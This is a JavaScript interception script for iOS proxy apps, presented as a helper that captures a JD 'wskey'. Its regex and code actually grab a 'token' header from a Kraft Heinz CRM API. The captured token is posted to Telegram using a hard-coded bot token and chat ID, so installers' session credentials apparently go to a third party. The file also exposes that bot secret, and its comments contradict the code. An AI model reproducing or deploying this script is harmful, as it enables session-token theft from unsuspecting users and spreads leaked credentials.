/**
 * 
 * 使用方法：打开某东，然后点击右上角气泡（消息）按钮，等待数秒即可。
 * 
 * BoxJs: https://raw.githubusercontent.com/chiupam/surge/main/boxjs/chiupam.boxjs.json
 * 
 * hostname: api-dd.jd.com
 * 
 * type: http-request
 * regex: ^https?:\/\/fscrm\.kraftheinz\.net\.cn\/crm\/public\/index\.php\/api\/v1\/getUserInfo
 * script-path: https://raw.githubusercontent.com/chiupam/scripts/master/jd/wskey.js
 * requires-body: 1 | true
 * 
 * =============== Surge ===============
 * kafu获取wskey = type=http-request, pattern=^https?://api-dd\.jd\.com/client\.action\?functionId=getSessionLog, requires-body=1, max-size=-1, script-path=https://raw.githubusercontent.com/chiupam/surge/main/scripts/javascripts/wskey.js, script-update-interval=0, timeout=10
 * 
 * =============== Loon ===============
 * http-request ^https?://api-dd\.jd\.com/client\.action\?functionId=getSessionLog script-path=https://raw.githubusercontent.com/chiupam/surge/main/scripts/javascripts/wskey.js, requires-body=true, timeout=10, tag=kafu获取wskey
 * 
 * =============== Quan X ===============
 * ^https?://api-dd\.jd\.com/client\.action\?functionId=getSessionLog url script-request-header https://raw.githubusercontent.com/chiupam/surge/main/scripts/javascripts/wskey.js
 * 
 */

const $ = Env()
const user_id = 5486328200
const bot_token = "5638252159:AAH5Depy-7Yvlz2odo_s7juB8nUBuvBs3bc"
if (typeof $request !== 'undefined') start()

function arg() {
  try {return $argument.match(/api=(.*)/)[1]} 
  catch {return `none&none`}
}

async function start() {
  if (!$.read("kf_time")) $.write((Date.parse(new Date())/1000 - 20).toString(), 'kf_time')
  if (Date.parse(new Date())/1000 - ($.read("kf_time") * 1)  > 15) {
    kafu_token = $request.headers.token
    $.write((Date.parse(new Date())/1000).toString(), 'kf_time')
    if (user_id && user_id != `none` && bot_token) {
      await tgNotify(kafu_token)
      $.write("undefined", "kafu_token")
    } else {
      $.notice("【卡夫】", "前往boxjs中查询，或查看脚本运行日志！", `数据键：kafu_token\n` + kafu_token, "http://boxjs.net")
      $.write(kafu_token, "kafu_token")
    }
  }
  $.done()
}

function tgNotify(text) {
  $.log(text)
$.log(text)
$.log(text)
  return  new Promise((resolve) => {
    const options = {
      url: `https://api.telegram.org/bot${bot_token}/sendMessage`,
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: `chat_id=${user_id}&text=${text}&disable_web_page_preview=true`,
      timeout: 30000
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          $.log('Telegram Bot发送通知调用API失败！！')
          $.log(err)
        } else {
          data = JSON.parse(data)
          if (data.ok) {
            $.notice("【卡夫】", "Telegram Bot发送通知消息完成", kafu_token, "")
          } else {
            $.notice("【卡夫】", "Telegram Bot发送通知消息失败！", "前往boxjs中查询，或查看脚本运行日志！\n数据键：kafu_token", "http://boxjs.net")
          }
        }
      } catch (e) {
        $.log(e)
        $.log(resp)
      } finally {
        resolve()
      }
    })
  })
}


function Env() {
  LN = typeof $loon != "undefined"
  SG = typeof $httpClient != "undefined" && !LN
  QX = typeof $task != "undefined"
  read = (key) => {
    if (LN || SG) return $persistentStore.read(key)
    if (QX) return $prefs.valueForKey(key)
  }
  write = (key, val) => {
    if (LN || SG) return $persistentStore.write(key, val);
    if (QX) return $prefs.setValueForKey(key, val)
  }
  notice = (title, subtitle, message, url) => {
    if (LN) $notification.post(title, subtitle, message, url)
    if (SG) $notification.post(title, subtitle, message, { url: url })
    if (QX) $notify(title, subtitle, message, { "open-url": url })
  }
  get = (url, cb) => {
    if (LN || SG) {$httpClient.get(url, cb)}
    if (QX) {url.method = 'GET'; $task.fetch(url).then((resp) => cb(null, {}, resp.body))}
  }
  post = (url, cb) => {
    if (LN || SG) {$httpClient.post(url, cb)}
    if (QX) {url.method = 'POST'; $task.fetch(url).then((resp) => cb(null, {}, resp.body))}
  }
  put = (url, cb) => {
    if (LN || SG) {$httpClient.put(url, cb)}
    if (QX) {url.method = 'PUT'; $task.fetch(url).then((resp) => cb(null, {}, resp.body))}
  }
  log = (message) => console.log(message)
  done = (value = {}) => {$done(value)}
  return { LN, SG, QX, read, write, notice, get, post, put, log, done }
}
